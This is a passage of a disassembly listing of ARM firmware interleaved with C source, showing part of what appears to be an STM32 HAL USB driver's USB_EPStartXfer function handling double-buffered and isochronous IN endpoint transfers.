 8006fae:	891b      	ldrh	r3, [r3, #8]
 8006fb0:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006fb4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fb8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fbc:	681b      	ldr	r3, [r3, #0]
 8006fbe:	6959      	ldr	r1, [r3, #20]
 8006fc0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fc4:	b29b      	uxth	r3, r3
 8006fc6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006fca:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006fce:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006fd2:	6800      	ldr	r0, [r0, #0]
 8006fd4:	f001 fa65 	bl	80084a2 <USB_WritePMA>
 8006fd8:	e3ee      	b.n	80077b8 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006fda:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fde:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fe2:	681b      	ldr	r3, [r3, #0]
 8006fe4:	785b      	ldrb	r3, [r3, #1]
 8006fe6:	2b00      	cmp	r3, #0
 8006fe8:	d177      	bne.n	80070da <USB_EPStartXfer+0x650>
 8006fea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fee:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ff2:	681b      	ldr	r3, [r3, #0]
 8006ff4:	64bb      	str	r3, [r7, #72]	; 0x48
 8006ff6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ffa:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ffe:	681b      	ldr	r3, [r3, #0]
 8007000:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007004:	b29b      	uxth	r3, r3
 8007006:	461a      	mov	r2, r3
 8007008:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800700a:	4413      	add	r3, r2
 800700c:	64bb      	str	r3, [r7, #72]	; 0x48
 800700e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007012:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007016:	681b      	ldr	r3, [r3, #0]
 8007018:	781b      	ldrb	r3, [r3, #0]
 800701a:	00da      	lsls	r2, r3, #3
 800701c:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800701e:	4413      	add	r3, r2
 8007020:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007024:	647b      	str	r3, [r7, #68]	; 0x44
 8007026:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007028:	881b      	ldrh	r3, [r3, #0]
 800702a:	b29b      	uxth	r3, r3
 800702c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007030:	b29a      	uxth	r2, r3
 8007032:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007034:	801a      	strh	r2, [r3, #0]
 8007036:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800703a:	2b3e      	cmp	r3, #62	; 0x3e
 800703c:	d921      	bls.n	8007082 <USB_EPStartXfer+0x5f8>
 800703e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007042:	095b      	lsrs	r3, r3, #5
 8007044:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007048:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800704c:	f003 031f 	and.w	r3, r3, #31
 8007050:	2b00      	cmp	r3, #0
 8007052:	d104      	bne.n	800705e <USB_EPStartXfer+0x5d4>
 8007054:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007058:	3b01      	subs	r3, #1
 800705a:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800705e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007060:	881b      	ldrh	r3, [r3, #0]
 8007062:	b29a      	uxth	r2, r3
 8007064:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007068:	b29b      	uxth	r3, r3
 800706a:	029b      	lsls	r3, r3, #10
 800706c:	b29b      	uxth	r3, r3
 800706e:	4313      	orrs	r3, r2
 8007070:	b29b      	uxth	r3, r3
 8007072:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007076:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800707a:	b29a      	uxth	r2, r3
 800707c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800707e:	801a      	strh	r2, [r3, #0]
 8007080:	e056      	b.n	8007130 <USB_EPStartXfer+0x6a6>
 8007082:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007086:	2b00      	cmp	r3, #0
 8007088:	d10a      	bne.n	80070a0 <USB_EPStartXfer+0x616>
 800708a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800708c:	881b      	ldrh	r3, [r3, #0]
 800708e:	b29b      	uxth	r3, r3
 8007090:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007094:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007098:	b29a      	uxth	r2, r3
 800709a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800709c:	801a      	strh	r2, [r3, #0]
 800709e:	e047      	b.n	8007130 <USB_EPStartXfer+0x6a6>
 80070a0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070a4:	085b      	lsrs	r3, r3, #1
 80070a6:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80070aa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070ae:	f003 0301 	and.w	r3, r3, #1
 80070b2:	2b00      	cmp	r3, #0
 80070b4:	d004      	beq.n	80070c0 <USB_EPStartXfer+0x636>
 80070b6:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80070ba:	3301      	adds	r3, #1
 80070bc:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80070c0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80070c2:	881b      	ldrh	r3, [r3, #0]
 80070c4:	b29a      	uxth	r2, r3
 80070c6:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80070ca:	b29b      	uxth	r3, r3
 80070cc:	029b      	lsls	r3, r3, #10
 80070ce:	b29b      	uxth	r3, r3
 80070d0:	4313      	orrs	r3, r2
 80070d2:	b29a      	uxth	r2, r3
 80070d4:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80070d6:	801a      	strh	r2, [r3, #0]
 80070d8:	e02a      	b.n	8007130 <USB_EPStartXfer+0x6a6>
 80070da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070de:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070e2:	681b      	ldr	r3, [r3, #0]
 80070e4:	785b      	ldrb	r3, [r3, #1]
 80070e6:	2b01      	cmp	r3, #1
 80070e8:	d122      	bne.n	8007130 <USB_EPStartXfer+0x6a6>
 80070ea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070ee:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070f2:	681b      	ldr	r3, [r3, #0]
 80070f4:	653b      	str	r3, [r7, #80]	; 0x50
 80070f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070fa:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070fe:	681b      	ldr	r3, [r3, #0]
 8007100:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007104:	b29b      	uxth	r3, r3
 8007106:	461a      	mov	r2, r3
 8007108:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800710a:	4413      	add	r3, r2
 800710c:	653b      	str	r3, [r7, #80]	; 0x50
 800710e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007112:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007116:	681b      	ldr	r3, [r3, #0]
 8007118:	781b      	ldrb	r3, [r3, #0]
 800711a:	00da      	lsls	r2, r3, #3
 800711c:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800711e:	4413      	add	r3, r2
 8007120:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007124:	64fb      	str	r3, [r7, #76]	; 0x4c
 8007126:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800712a:	b29a      	uxth	r2, r3
 800712c:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 800712e:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8007130:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007134:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007138:	681b      	ldr	r3, [r3, #0]
 800713a:	891b      	ldrh	r3, [r3, #8]
 800713c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007140:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007144:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007148:	681b      	ldr	r3, [r3, #0]
 800714a:	6959      	ldr	r1, [r3, #20]
 800714c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007150:	b29b      	uxth	r3, r3
 8007152:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007156:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800715a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800715e:	6800      	ldr	r0, [r0, #0]
 8007160:	f001 f99f 	bl	80084a2 <USB_WritePMA>
            ep->xfer_buff += len;
 8007164:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007168:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800716c:	681b      	ldr	r3, [r3, #0]
 800716e:	695a      	ldr	r2, [r3, #20]
 8007170:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007174:	441a      	add	r2, r3
 8007176:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800717a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800717e:	681b      	ldr	r3, [r3, #0]
 8007180:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8007182:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007186:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800718a:	681b      	ldr	r3, [r3, #0]
 800718c:	6a1a      	ldr	r2, [r3, #32]
 800718e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007192:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007196:	681b      	ldr	r3, [r3, #0]
 8007198:	691b      	ldr	r3, [r3, #16]
 800719a:	429a      	cmp	r2, r3
 800719c:	d90f      	bls.n	80071be <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 800719e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071a2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071a6:	681b      	ldr	r3, [r3, #0]
 80071a8:	6a1a      	ldr	r2, [r3, #32]
 80071aa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ae:	1ad2      	subs	r2, r2, r3
 80071b0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071b4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071b8:	681b      	ldr	r3, [r3, #0]
 80071ba:	621a      	str	r2, [r3, #32]
 80071bc:	e00e      	b.n	80071dc <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 80071be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071c6:	681b      	ldr	r3, [r3, #0]
 80071c8:	6a1b      	ldr	r3, [r3, #32]
 80071ca:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 80071ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071d2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071d6:	681b      	ldr	r3, [r3, #0]
 80071d8:	2200      	movs	r2, #0
 80071da:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 80071dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071e0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071e4:	681b      	ldr	r3, [r3, #0]
 80071e6:	643b      	str	r3, [r7, #64]	; 0x40
 80071e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071f0:	681b      	ldr	r3, [r3, #0]
 80071f2:	785b      	ldrb	r3, [r3, #1]
 80071f4:	2b00      	cmp	r3, #0
 80071f6:	d177      	bne.n	80072e8 <USB_EPStartXfer+0x85e>
 80071f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071fc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007200:	681b      	ldr	r3, [r3, #0]
 8007202:	63bb      	str	r3, [r7, #56]	; 0x38
 8007204:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007208:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800720c:	681b      	ldr	r3, [r3, #0]
 800720e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007212:	b29b      	uxth	r3, r3
 8007214:	461a      	mov	r2, r3
 8007216:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007218:	4413      	add	r3, r2
 800721a:	63bb      	str	r3, [r7, #56]	; 0x38
 800721c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007220:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007224:	681b      	ldr	r3, [r3, #0]
 8007226:	781b      	ldrb	r3, [r3, #0]
 8007228:	00da      	lsls	r2, r3, #3
 800722a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800722c:	4413      	add	r3, r2
 800722e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007232:	637b      	str	r3, [r7, #52]	; 0x34
 8007234:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007236:	881b      	ldrh	r3, [r3, #0]
 8007238:	b29b      	uxth	r3, r3
 800723a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800723e:	b29a      	uxth	r2, r3
 8007240:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007242:	801a      	strh	r2, [r3, #0]
 8007244:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007248:	2b3e      	cmp	r3, #62	; 0x3e
 800724a:	d921      	bls.n	8007290 <USB_EPStartXfer+0x806>
 800724c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007250:	095b      	lsrs	r3, r3, #5
 8007252:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007256:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800725a:	f003 031f 	and.w	r3, r3, #31
 800725e:	2b00      	cmp	r3, #0
 8007260:	d104      	bne.n	800726c <USB_EPStartXfer+0x7e2>
 8007262:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007266:	3b01      	subs	r3, #1
 8007268:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800726c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800726e:	881b      	ldrh	r3, [r3, #0]
 8007270:	b29a      	uxth	r2, r3
 8007272:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007276:	b29b      	uxth	r3, r3
 8007278:	029b      	lsls	r3, r3, #10
 800727a:	b29b      	uxth	r3, r3
 800727c:	4313      	orrs	r3, r2
 800727e:	b29b      	uxth	r3, r3
 8007280:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007284:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007288:	b29a      	uxth	r2, r3
 800728a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800728c:	801a      	strh	r2, [r3, #0]
 800728e:	e050      	b.n	8007332 <USB_EPStartXfer+0x8a8>
 8007290:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007294:	2b00      	cmp	r3, #0
 8007296:	d10a      	bne.n	80072ae <USB_EPStartXfer+0x824>
 8007298:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800729a:	881b      	ldrh	r3, [r3, #0]
 800729c:	b29b      	uxth	r3, r3
 800729e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80072a2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80072a6:	b29a      	uxth	r2, r3
 80072a8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80072aa:	801a      	strh	r2, [r3, #0]
 80072ac:	e041      	b.n	8007332 <USB_EPStartXfer+0x8a8>
 80072ae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072b2:	085b      	lsrs	r3, r3, #1
 80072b4:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80072b8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072bc:	f003 0301 	and.w	r3, r3, #1
 80072c0:	2b00      	cmp	r3, #0
 80072c2:	d004      	beq.n	80072ce <USB_EPStartXfer+0x844>
 80072c4:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80072c8:	3301      	adds	r3, #1
 80072ca:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80072ce:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80072d0:	881b      	ldrh	r3, [r3, #0]
 80072d2:	b29a      	uxth	r2, r3
 80072d4:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80072d8:	b29b      	uxth	r3, r3
 80072da:	029b      	lsls	r3, r3, #10
 80072dc:	b29b      	uxth	r3, r3
 80072de:	4313      	orrs	r3, r2
 80072e0:	b29a      	uxth	r2, r3
 80072e2:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80072e4:	801a      	strh	r2, [r3, #0]
 80072e6:	e024      	b.n	8007332 <USB_EPStartXfer+0x8a8>
 80072e8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072ec:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072f0:	681b      	ldr	r3, [r3, #0]
 80072f2:	785b      	ldrb	r3, [r3, #1]
 80072f4:	2b01      	cmp	r3, #1
 80072f6:	d11c      	bne.n	8007332 <USB_EPStartXfer+0x8a8>
 80072f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072fc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007300:	681b      	ldr	r3, [r3, #0]
 8007302:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007306:	b29b      	uxth	r3, r3
 8007308:	461a      	mov	r2, r3
 800730a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 800730c:	4413      	add	r3, r2
 800730e:	643b      	str	r3, [r7, #64]	; 0x40
 8007310:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007314:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007318:	681b      	ldr	r3, [r3, #0]
 800731a:	781b      	ldrb	r3, [r3, #0]
 800731c:	00da      	lsls	r2, r3, #3
 800731e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007320:	4413      	add	r3, r2
 8007322:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007326:	63fb      	str	r3, [r7, #60]	; 0x3c
 8007328:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800732c:	b29a      	uxth	r2, r3
 800732e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8007330:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8007332:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007336:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800733a:	681b      	ldr	r3, [r3, #0]
 800733c:	895b      	ldrh	r3, [r3, #10]
 800733e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007342:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007346:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800734a:	681b      	ldr	r3, [r3, #0]
 800734c:	6959      	ldr	r1, [r3, #20]
 800734e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007352:	b29b      	uxth	r3, r3
 8007354:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007358:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800735c:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007360:	6800      	ldr	r0, [r0, #0]
 8007362:	f001 f89e 	bl	80084a2 <USB_WritePMA>
 8007366:	e227      	b.n	80077b8 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 8007368:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800736c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007370:	681b      	ldr	r3, [r3, #0]
 8007372:	6a1b      	ldr	r3, [r3, #32]
 8007374:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 8007378:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800737c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007380:	681a      	ldr	r2, [r3, #0]
 8007382:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007386:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800738a:	681b      	ldr	r3, [r3, #0]
 800738c:	781b      	ldrb	r3, [r3, #0]
 800738e:	009b      	lsls	r3, r3, #2
 8007390:	4413      	add	r3, r2
 8007392:	881b      	ldrh	r3, [r3, #0]
 8007394:	b29b      	uxth	r3, r3
 8007396:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 800739a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800739e:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 80073a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073a6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073aa:	681a      	ldr	r2, [r3, #0]
 80073ac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073b0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073b4:	681b      	ldr	r3, [r3, #0]
 80073b6:	781b      	ldrb	r3, [r3, #0]
 80073b8:	009b      	lsls	r3, r3, #2
 80073ba:	441a      	add	r2, r3
 80073bc:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80073c0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80073c4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80073c8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80073cc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80073d0:	b29b      	uxth	r3, r3
 80073d2:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 80073d4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073d8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073dc:	681b      	ldr	r3, [r3, #0]
 80073de:	65fb      	str	r3, [r7, #92]	; 0x5c
 80073e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073e4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073e8:	681b      	ldr	r3, [r3, #0]
 80073ea:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80073ee:	b29b      	uxth	r3, r3
 80073f0:	461a      	mov	r2, r3
 80073f2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80073f4:	4413      	add	r3, r2
 80073f6:	65fb      	str	r3, [r7, #92]	; 0x5c
 80073f8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073fc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007400:	681b      	ldr	r3, [r3, #0]
 8007402:	781b      	ldrb	r3, [r3, #0]
 8007404:	00da      	lsls	r2, r3, #3
 8007406:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007408:	4413      	add	r3, r2
 800740a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800740e:	65bb      	str	r3, [r7, #88]	; 0x58
 8007410:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007414:	b29a      	uxth	r2, r3
 8007416:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8007418:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 800741a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800741e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007422:	681b      	ldr	r3, [r3, #0]
 8007424:	891b      	ldrh	r3, [r3, #8]
 8007426:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800742a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800742e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007432:	681b      	ldr	r3, [r3, #0]
 8007434:	6959      	ldr	r1, [r3, #20]
 8007436:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800743a:	b29b      	uxth	r3, r3
 800743c:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007440:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007444:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007448:	6800      	ldr	r0, [r0, #0]
 800744a:	f001 f82a 	bl	80084a2 <USB_WritePMA>
 800744e:	e1b3      	b.n	80077b8 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 8007450:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007454:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007458:	681b      	ldr	r3, [r3, #0]
 800745a:	6a1a      	ldr	r2, [r3, #32]
 800745c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007460:	1ad2      	subs	r2, r2, r3
 8007462:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007466:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800746a:	681b      	ldr	r3, [r3, #0]
 800746c:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 800746e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007472:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007476:	681a      	ldr	r2, [r3, #0]
 8007478:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800747c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007480:	681b      	ldr	r3, [r3, #0]
 8007482:	781b      	ldrb	r3, [r3, #0]
 8007484:	009b      	lsls	r3, r3, #2
 8007486:	4413      	add	r3, r2
 8007488:	881b      	ldrh	r3, [r3, #0]
 800748a:	b29b      	uxth	r3, r3
 800748c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007490:	2b00      	cmp	r3, #0
 8007492:	f000 80c6 	beq.w	8007622 <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007496:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800749a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800749e:	681b      	ldr	r3, [r3, #0]
 80074a0:	673b      	str	r3, [r7, #112]	; 0x70
 80074a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074a6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074aa:	681b      	ldr	r3, [r3, #0]
 80074ac:	785b      	ldrb	r3, [r3, #1]
 80074ae:	2b00      	cmp	r3, #0
 80074b0:	d177      	bne.n	80075a2 <USB_EPStartXfer+0xb18>
 80074b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074b6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074ba:	681b      	ldr	r3, [r3, #0]
 80074bc:	66bb      	str	r3, [r7, #104]	; 0x68
 80074be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074c2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074c6:	681b      	ldr	r3, [r3, #0]
 80074c8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80074cc:	b29b      	uxth	r3, r3
 80074ce:	461a      	mov	r2, r3
 80074d0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80074d2:	4413      	add	r3, r2
 80074d4:	66bb      	str	r3, [r7, #104]	; 0x68
 80074d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
